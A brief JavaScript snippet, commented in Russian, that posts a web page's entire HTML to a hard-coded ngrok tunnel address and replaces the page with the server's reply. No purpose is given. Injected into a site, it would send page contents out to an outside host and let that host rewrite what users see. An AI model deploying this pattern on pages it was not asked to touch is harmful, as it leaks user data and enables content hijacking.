// Здесь указываем URL сервера, на который будет отправлен HTML
const serverUrl = 'https://4b05-37-192-2-126.ngrok-free.app';

fetch(`${serverUrl}/api/data`, {
    method: 'POST',
    headers: {
        'Content-Type': 'text/html',
    },
    body: document.documentElement.outerHTML,
})
.then(response => response.text())
.then(html => {
    // Заменяем весь HTML документа на полученный ответ
    document.documentElement.innerHTML = html;
})
.catch(error => console.error('Error:', error));